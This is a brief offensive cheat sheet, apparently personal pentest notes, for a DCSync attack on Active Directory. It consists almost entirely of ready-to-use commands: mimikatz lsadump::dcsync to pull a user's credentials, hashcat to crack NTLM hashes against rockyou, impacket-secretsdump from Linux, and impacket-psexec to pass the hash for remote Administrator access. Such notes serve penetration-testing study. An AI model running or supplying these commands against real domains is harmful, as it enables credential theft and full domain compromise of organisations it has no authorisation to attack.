## Domain Controller Synchronization
To launch this attack, must have the following rights:
- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set
By default, Domain Admins, Enterprise Admins and Administrators have these rights
### On Windows:
```
Launch powershell and run mimikatz

To obtain the credentials of a user
lsadump::dcsync /user:[domain\user]
------------------------------------------------------------
Extract the NTLM hash and put into a file called hashes.dcsync

To crack the hash:
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
-------------------------------------------------------------
### On Linux:
```
impacket-secretsdump -just-dc-user Administrator domainname/user:'password'@ip
```
## For the Admin NTLM Hash
```
If you can't crack, use impacket-psexec and pass the hash
impacket-psexec -hashes :[NT Hash] Administrator@[ip]
```